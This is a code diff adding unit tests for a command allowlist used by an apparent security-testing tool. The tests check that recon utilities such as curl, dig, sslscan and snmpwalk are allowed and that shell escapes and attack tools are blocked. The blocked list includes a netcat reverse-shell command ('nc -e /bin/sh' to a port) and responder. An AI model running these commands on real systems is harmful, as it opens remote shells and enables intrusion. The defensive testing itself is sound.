@@ -16,6 +16,7 @@ from cerno_pkg.config import (
     load_config,
     save_config,
 )
+from cerno_pkg.exec_chain import is_runnable
 
 _DEFAULT_ALLOWLIST = list(DEFAULT_MCP_EXEC_ALLOWLIST)
 _DEFAULT_DENYLIST = list(DEFAULT_MCP_EXEC_DENYLIST)
@@ -72,6 +73,53 @@ def test_claude_assistant_default_persists_false(config_path):
 def test_default_allowlist_drops_proxychains():
     # proxychains4 is unwrapped (and covered by use_proxy), so it needs no entry.
     assert "proxychains4" not in _DEFAULT_ALLOWLIST
+
+
+@pytest.mark.unit
+@pytest.mark.parametrize(
+    "command",
+    [
+        ["curl", "-sk", "https://10.0.0.1"],
+        ["wget", "-nc", "-r", "-i", "browsable.urls"],
+        ["dig", "example.com"],
+        ["host", "example.com"],
+        ["nslookup", "example.com"],
+        ["whois", "example.com"],
+        ["ping", "-c", "1", "10.0.0.1"],
+        ["traceroute", "10.0.0.1"],
+        ["ssh-audit", "10.0.0.1"],
+        ["sslscan", "10.0.0.1:443"],
+        ["testssl.sh", "10.0.0.1:443"],
+        ["testssl", "10.0.0.1:443"],
+        ["whatweb", "http://10.0.0.1"],
+        ["showmount", "-e", "10.0.0.1"],
+        ["rpcinfo", "-p", "10.0.0.1"],
+        ["snmpwalk", "-v2c", "-c", "public", "10.0.0.1"],
+        ["onesixtyone", "10.0.0.1"],
+        ["sudo", "curl", "https://10.0.0.1"],
+    ],
+)
+def test_default_allowlist_permits_recon_utilities(command):
+    ok, reason = is_runnable(command, _DEFAULT_ALLOWLIST, _DEFAULT_DENYLIST)
+    assert ok, reason
+
+
+@pytest.mark.unit
+@pytest.mark.parametrize(
+    "command",
+    [
+        ["bash", "-c", "id"],
+        ["python3", "-c", "print(1)"],
+        ["find", ".", "-exec", "id", ";"],
+        ["ssh", "user@10.0.0.1"],
+        ["nc", "-e", "/bin/sh", "10.0.0.1", "4444"],
+        ["smbclient", "-L", "//10.0.0.1"],
+        ["responder", "-I", "eth0"],
+    ],
+)
+def test_default_allowlist_excludes_shell_escapes_and_attack_tools(command):
+    ok, _ = is_runnable(command, _DEFAULT_ALLOWLIST, _DEFAULT_DENYLIST)
+    assert not ok
 
 
 @pytest.mark.unit
